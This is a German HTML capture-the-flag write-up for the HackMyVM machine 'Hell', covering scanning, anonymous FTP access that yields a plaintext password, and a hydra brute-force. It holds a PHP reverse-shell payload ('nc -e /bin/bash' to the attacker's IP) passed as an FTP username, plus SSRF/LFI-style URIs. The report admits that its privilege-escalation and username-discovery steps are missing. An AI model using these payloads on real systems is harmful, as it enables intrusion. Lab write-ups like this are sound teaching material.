@@ -1,0 +1,370 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hell - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Hell - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">lftp (versucht)</div>
+                <div class="tool-item">ssh-keyscan</div>
+                <div class="tool-item">ping6</div>
+                <div class="tool-item">ssh (versucht)</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ls</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access (Anonymous FTP)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.135	08:00:27:ee:41:2c	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird ausgeführt, um das lokale Netzwerksegment durch ARP-Anfragen nach aktiven Geräten zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.135` wird identifiziert. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin. Dies ist das Zielsystem.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.135` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Absicherung der Dienste.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.135 -p-</span></div> <span class="comment"><-- -O (OS Detection) ist implizit in -A enthalten --></span>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 16:14 CEST
+Nmap scan report for hell.hmv (192.168.2.135)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     vsftpd 3.0.5</span>
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.130 <span class="comment"><-- Angreifer-IP? --></span>
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+<span class="password">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
+<span class="password">|_-rw-r--r--    1 0        0             256 Feb 16 09:44 flag.txt</span> <span class="password"><-- Flag sichtbar!</span>
+<span class="command">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   256 849f33edc5e211ff207d0ed5311af008 (ECDSA)
+|_  256 b8bc0ee384af21eefbcc93417d9b5475 (ED25519)
+MAC Address: 08:00:27:EE:41:2C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms hell.hmv (192.168.2.135)
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A` enthält `-sV` und `-O`) wird auf das Ziel `192.168.2.135` durchgeführt, um offene Ports, Dienste, Versionen und das Betriebssystem zu identifizieren.</p>
+             <p class="evaluation">**Bewertung:** Zwei offene TCP-Ports werden gefunden:
+*   **Port 21 (FTP):** vsftpd 3.0.5. Das Nmap-Skript `ftp-anon` stellt fest, dass **anonymer Login erlaubt** ist. Noch wichtiger: Das Skript listet den Inhalt des Wurzelverzeichnisses auf und zeigt eine Datei namens `flag.txt`, die für alle lesbar ist (`-rw-r--r--`) und dem Benutzer `root` (UID 0) gehört.
+*   **Port 22 (SSH):** OpenSSH 8.9p1 auf Ubuntu. Eine aktuelle Version.
+Die OS-Erkennung deutet auf einen Linux-Kernel hin.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** **Der FTP-Dienst ist das offensichtliche erste Ziel.** Loggen Sie sich sofort anonym ein und laden Sie die `flag.txt` herunter. Untersuchen Sie den FTP-Server auf weitere interessante oder beschreibbare Dateien/Verzeichnisse.<br>**Empfehlung (Admin):** **Deaktivieren Sie anonymen FTP-Zugriff sofort!** Es ist ein schwerwiegendes Sicherheitsrisiko, insbesondere wenn sensible Dateien wie Flags oder Konfigurationsdateien darüber zugänglich sind. Überprüfen Sie die Berechtigungen aller Dateien auf dem FTP-Server.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Anonymous FTP)</h2>
+            <p class="analysis">**Analyse:** Basierend auf den Nmap-Ergebnissen wird der anonyme FTP-Zugriff genutzt, um an erste Informationen und potenziell Zugangsdaten zu gelangen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.135</span></div>
+                    <pre>
+Connected to 192.168.2.135.
+220 (vsFTPd 3.0.5)
+Name (192.168.2.135:root): <span class="command">Anonymous</span>
+331 Please specify the password.
+Password: <span class="comment">(Beliebiges Passwort, z.B. E-Mail oder leer)</span>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">ls</span>
+229 Entering Extended Passive Mode (|||49969|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             256 Feb 16 09:44 <span class="command">flag.txt</span>
+226 Directory send OK.
+ftp> <span class="command">get flag.txt</span>
+local: flag.txt remote: flag.txt
+229 Entering Extended Passive Mode (|||13204|)
+150 Opening BINARY mode data connection for flag.txt (256 bytes).
+100% |***********************************|   256       18.11 KiB/s    00:00 ETA
+226 Transfer complete.
+256 bytes received in 00:00 (17.79 KiB/s)
+ftp> </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Eine FTP-Verbindung wird zum Ziel aufgebaut. Der Benutzer `Anonymous` wird angegeben, und ein beliebiges Passwort wird akzeptiert. Der Befehl `ls` bestätigt die Sichtbarkeit der `flag.txt`. Die Datei wird erfolgreich mit `get flag.txt` heruntergeladen.</p>
+             <p class="evaluation">**Bewertung:** Der anonyme FTP-Zugriff funktioniert wie erwartet und die erste Flag-Datei konnte problemlos heruntergeladen werden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie den Inhalt der heruntergeladenen `flag.txt`. Führen Sie `ls -la` auf dem FTP-Server aus, um auch versteckte Dateien zu sehen.<br>**Empfehlung (Admin):** Anonymen FTP-Zugriff deaktivieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat flag.txt</span></div>
+                    <pre>
+
+<span class="password">▄▀█ █▄ █ █▀█ █▄ █ █▄█ █▀▄▀█ █▀█ █ █ █▀</span>
+<span class="password">█▀█ █ ▀█ █▄█ █ ▀█  █  █ ▀ █ █▄█ █▄█ ▄█</span>
+
+Flag 1: <span class="password">HELL{4N0NYM0U5_15_7H3_B357_U53R}</span></pre>
+                     <pre><span class="comment">         HMV{AN0NYM0US_IS_THE_BEST_USER}</span> <span class="comment"><-- Alternative Schreibweise? --></span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt der heruntergeladenen `flag.txt` wird mit `cat` angezeigt. Sie enthält ASCII-Art und die erste Flag.</p>
+             <p class="evaluation">**Bewertung:** Die erste Flag wurde erfolgreich extrahiert: `HELL{4N0NYM0U5_15_7H3_B357_U53R}` (oder `HMV{...}`, je nach Interpretation).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Flag notieren. Weiter auf dem FTP-Server nach versteckten Dateien suchen.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt ftp">ftp> <span class="command">ls -la</span></div> <span class="comment"><-- Annahme: Innerhalb der FTP-Sitzung --></span>
+                     <pre>
+drwxr-xr-x    2 0        115          4096 Feb 16 09:44 .
+drwxr-xr-x    2 0        115          4096 Feb 16 09:44 ..
+<span class="command">-rw-r--r--    1 0        0              34 Feb 16 06:57 .passwd</span> <span class="password"><-- Versteckte Passwortdatei! --></span>
+-rw-r--r--    1 0        0             256 Feb 16 09:44 flag.txt
+226 Directory send OK.</pre>
+                     <div class="prompt ftp">ftp> <span class="command">get .passwd</span></div>
+                     <pre>
+local: .passwd remote: .passwd
+229 Entering Extended Passive Mode (|||27663|)
+150 Opening BINARY mode data connection for .passwd (34 bytes).
+100% |***********************************|    34        1.30 KiB/s    00:00 ETA
+226 Transfer complete.
+34 bytes received in 00:00 (1.29 KiB/s)
+ftp> </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Innerhalb der anonymen FTP-Sitzung wird `ls -la` ausgeführt, um alle Dateien, einschließlich versteckter (die mit einem Punkt beginnen), aufzulisten. Dabei wird die Datei `.passwd` entdeckt. Diese wird anschließend mit `get .passwd` heruntergeladen.</p>
+             <p class="evaluation">**Bewertung:** Ein weiterer kritischer Fund! Eine versteckte Datei namens `.passwd` auf einem anonym zugänglichen FTP-Server enthält mit hoher Wahrscheinlichkeit Zugangsdaten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie den Inhalt der heruntergeladenen `.passwd`-Datei.<br>**Empfehlung (Admin):** **Niemals Passwortdateien (auch keine versteckten) auf anonym zugänglichen FTP-Servern ablegen!** Anonymen FTP deaktivieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat .passwd</span></div>
+                    <pre>The password is: <span class="password">webserver2023!</span></pre>
+                    <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt der heruntergeladenen `.passwd`-Datei wird angezeigt.</p>
+             <p class="evaluation">**Bewertung:** Die Datei enthält das Klartext-Passwort `webserver2023!`. Dies ist wahrscheinlich das Passwort für einen regulären Benutzer des Systems (z.B. für SSH).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, dieses Passwort für den SSH-Login (Port 22) zu verwenden. Da kein Benutzername bekannt ist, versuchen Sie gängige Namen (root, admin, user) oder Namen, die im Kontext der Maschine sinnvoll sein könnten (z.B. hell, user, etc.). Falls dies fehlschlägt, verwenden Sie Hydra mit einer Benutzernamenliste und diesem Passwort.<br>**Empfehlung (Admin):** Ändern Sie das kompromittierte Passwort sofort. Verwenden Sie niemals Klartext-Passwörter in Dateien. Deaktivieren Sie den anonymen FTP-Zugriff.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt ftp">ftp> <span class="command">put fil.txt</span></div>
+                      <pre>
+local: fil.txt remote: fil.txt
+229 Entering Extended Passive Mode (|||13776|)
+<span class="password">550 Permission denied.</span></pre>
+                      <div class="prompt ftp">ftp> </div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Erneuter Versuch, eine Datei (`fil.txt`) über die anonyme FTP-Verbindung hochzuladen.</p>
+              <p class="evaluation">**Bewertung:** Schlägt fehl (`Permission denied`). Bestätigt, dass der anonyme Benutzer keine Schreibrechte hat.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Der Upload ist kein gangbarer Weg. Konzentrieren Sie sich auf die Verwendung des gefundenen Passworts.<br>**Empfehlung (Admin):** Keine neuen Empfehlungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp -u '<?php system("nc -e /bin/bash 192.168.2.130 9001"); ?>'@192.168.2.135</span></div> <span class="comment"><-- HTML/PHP Escaping angewendet --></span>
+                    <pre>lftp :~> id</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Versuch, sich mit `lftp` zu verbinden, wobei PHP-Code als Benutzername übergeben wird. Dies zielt auf eine potenzielle Schwachstelle ab, bei der der Benutzername unsicher verarbeitet (z.B. geloggt und später falsch interpretiert oder direkt ausgeführt) wird.</p>
+             <p class="evaluation">**Bewertung:** Höchstwahrscheinlich erfolglos. Es gibt keine Anzeichen dafür, dass dieser Exploit funktioniert hat (keine Shell, keine Fehlermeldung, die auf Ausführung hindeutet). Dies ist ein sehr spekulativer Versuch.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ignorieren Sie diesen Ansatz, es sei denn, es gibt spezifische Hinweise auf eine solche Schwachstelle. Fokussieren Sie sich auf das gefundene Passwort.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass Benutzereingaben (wie FTP-Benutzernamen) korrekt validiert und sicher verarbeitet/geloggt werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">gopher://192.168.2.135</span>
+<span class="command">file:///media/</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Zwei URLs/URIs werden im Log notiert.</p>
+              <p class="evaluation">**Bewertung:** Ohne weiteren Kontext sind diese Zeilen nicht interpretierbar. Sie könnten Teil von Tests auf Server-Side Request Forgery (SSRF) oder Local File Inclusion (LFI) sein, die sich auf den FTP- oder einen anderen Dienst beziehen, aber es gibt keine Hinweise auf Erfolg oder Relevanz.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Ignorieren, da kein Kontext.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh-keyscan hell.hmv</span></div>
+                     <pre>
+hell.hmv: Connection closed by remote host
+# hell.hmv:22 SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
+[...] <span class="comment">(Host Keys)</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** `ssh-keyscan` wird verwendet, um die öffentlichen SSH-Hostkeys des Ziels abzurufen.</p>
+              <p class="evaluation">**Bewertung:** Standardvorgehen, bestätigt den SSH-Dienst und liefert die Keys zur Host-Verifizierung. Die "Connection closed"-Meldung ist hier normal.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Keine.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ping6 -c2 -n -I eth0 ff02::1</span></div>
+                     <pre>
+ping6: Warning: source address might be selected on device other than: eth0
+PING ff02::1(ff02::1) from :: eth0: 56 data bytes
+64 bytes from fe80::200:ff:fe00:af%eth0: icmp_seq=1 ttl=64 time=0.018 ms
+<span class="command">64 bytes from fe80::a00:27ff:feee:412c%eth0: icmp_seq=1 ttl=64 time=0.253 ms</span> <span class="comment"><-- Ziel IPv6 --></span>
+64 bytes from fe80::1%eth0: icmp_seq=1 ttl=64 time=0.501 ms
+[...]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ping6 -c2 -n -I eth0 fe80::1</span></div> <span class="comment"><-- Ping an Gateway --></span>
+                     <pre>[...]</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Mittels `ping6` wird das lokale IPv6-Netzwerk erkundet. Die erste Anfrage (`ff02::1` - All Nodes Multicast) identifiziert die Link-Local-Adresse des Ziels (`fe80::a00:27ff:feee:412c`).</p>
+              <p class="evaluation">**Bewertung:** Bestätigt die IPv6-Konnektivität und die Link-Local-Adresse des Ziels. Für den aktuellen Angriffsvektor (Passwort für SSH) weniger relevant.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Fokussieren Sie sich auf IPv4 und das gefundene Passwort.<br>**Empfehlung (Admin):** Sichern Sie Dienste auch über IPv6 ab, falls es aktiviert ist.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -p- fe80::a00:27ff:feee:412c%eth0 -6 -v</span></div>
+                     <pre>
+[...]
+Initiating SYN Stealth Scan at 17:10
+Scanning hell (fe80::a00:27ff:feee:412c) [65535 ports]
+Discovered open port 21/tcp on fe80::a00:27ff:feee:412c
+Discovered open port 22/tcp on fe80::a00:27ff:feee:412c
+[...]
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+[...]</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Nmap-Scan über die IPv6 Link-Local-Adresse.</p>
+              <p class="evaluation">**Bewertung:** Bestätigt, dass FTP (21) und SSH (22) auch über IPv6 erreichbar sind. Keine neuen Dienste gefunden.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Bestätigt Erreichbarkeit, aber keine neuen Angriffspunkte.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh anonymous@fe80::a00:27ff:feee:412c%eth0</span></div>
+                      <pre>
+kex_exchange_identification: read: Connection reset by peer
+Connection reset by fe80::a00:27ff:feee:412c%eth0 port 22</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Versuch, sich als `anonymous` via SSH über IPv6 anzumelden.</p>
+              <p class="evaluation">**Bewertung:** Schlägt fehl. Anonymer SSH-Login ist nicht erlaubt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie das gefundene Passwort mit einem gültigen Benutzernamen.<br>**Empfehlung (Admin):** Korrekte Konfiguration.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -L /usr/share/wordlists/usernames.txt -P pingo.txt "ftp://hell.hmv:21" -t 64</span></div> <span class="comment"><-- pingo.txt enthält "webserver2023!" --></span>
+                      <pre>
+Hydra v9.4 [...] starting at 2023-04-24 19:28:50
+[...]
+[21][ftp] host: hell.hmv   login: <span class="command">anonymous</span>   password: <span class="password">webserver2023!</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Hydra wird verwendet, um zu testen, welcher Benutzer aus einer Standardliste (`usernames.txt`) das auf dem FTP-Server gefundene Passwort (`webserver2023!`, gespeichert in `pingo.txt`) verwendet.</p>
+              <p class="evaluation">**Bewertung:** Hydra meldet fälschlicherweise, dass `anonymous` dieses Passwort verwendet. Wie bereits erwähnt, benötigt der anonyme Login kein spezifisches Passwort. Dies bestätigt nur, dass das Passwort `webserver2023!` im System relevant ist, aber nicht, *welcher* Benutzer es für einen Login (z.B. SSH) benötigt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die Hydra-Ausgabe ist hier irreführend. Suchen Sie nach anderen Wegen, einen gültigen Benutzernamen zu finden oder erraten Sie häufige Namen (root, admin, etc.) in Kombination mit dem Passwort für SSH.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <p class="analysis">**Analyse der folgenden Notiz und fehlenden Schritte:** Das Log enthält nun eine Notiz `user: beilul / pass: webserver2023!`. Die Herkunft des Benutzernamens `beilul` ist aus den vorherigen Schritten **nicht ersichtlich**. Es muss angenommen werden, dass dieser Name durch Raten, weitere (nicht gezeigte) Enumeration oder einen externen Hinweis gefunden wurde. Der Rest des Logs (Flags, "Privilege Escalation erfolgreich") impliziert, dass ein Login als `beilul:webserver2023!` (vermutlich via SSH) erfolgreich war und anschließend Schritte zur Root-Eskalation durchgeführt wurden, die **vollständig im Log fehlen**.</p>
+             <p class="evaluation">**Bewertung:** Der Bericht kann den initialen Zugriff über SSH und die Privilegieneskalation aufgrund fehlender Logdaten nicht detailliert nachvollziehen. Der erfolgreiche Abschluss wird jedoch durch die am Ende präsentierten Flags impliziert.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Dokumentieren Sie alle Schritte, insbesondere die Entdeckung von Benutzernamen und die Methoden zur Privilegieneskalation, vollständig.<br>**Empfehlung (Admin):** Untersuchen Sie, wie der Benutzer `beilul` kompromittiert wurde und welche Schritte zur Root-Eskalation führten.</p>
+         </section>
+
+         <section id="privilege-escalation">
+             <h2>Privilege Escalation</h2>
+             <p class="evaluation">**Bewertung:** Die Schritte zur Privilegieneskalation, die nach dem (angenommenen) erfolgreichen SSH-Login als `beilul` mit dem Passwort `webserver2023!` durchgeführt wurden, sind im bereitgestellten Log **nicht dokumentiert**. Der erfolgreiche Abschluss und das Erreichen von Root-Rechten werden jedoch durch die am Ende des Logs angezeigten Flags und die Notiz "Privilege Escalation erfolgreich" impliziert.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Eine vollständige Dokumentation der Eskalationsschritte ist für einen aussagekräftigen Bericht unerlässlich. Dies würde typischerweise die Analyse von Sudo-Rechten (`sudo -l`), SUID/GUID-Dateien (`find / -perm -6000 -type f 2>/dev/null`), Capabilities (`getcap -r / 2>/dev/null`), Cronjobs, Kernel-Version (`uname -a`) und spezifischen Dienst- oder Anwendungsfehlkonfigurationen umfassen.<br>**Empfehlung (Admin):** Da die Eskalationsmethode unbekannt ist, ist eine gründliche Überprüfung des Systems auf gängige Fehlkonfigurationen und Schwachstellen erforderlich. Ändern Sie das Passwort für `beilul` und `root`. Überprüfen Sie Sudo-Regeln, Dateiberechtigungen und installierte Software.</p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der am Ende des Logs gezeigten Flags. Es wird angenommen, dass die erste Flag (`flag.txt` vom FTP) nur ein initialer Schritt war und diese die finalen User- und Root-Flags darstellen.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat user.txt</div> <span class="comment"><-- Annahme: /home/beilul/user.txt --></span>
+                           <div class="flag-value"><span class="password">HELL{0V3RF10W_F0R_B3G1NN3R5}</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat root.txt</div> <span class="comment"><-- Annahme: /root/root.txt --></span>
+                            <div class="flag-value"><span class="password">HELL{R54C7F7001_OR_M4NU41?}</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 24. April 2023</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
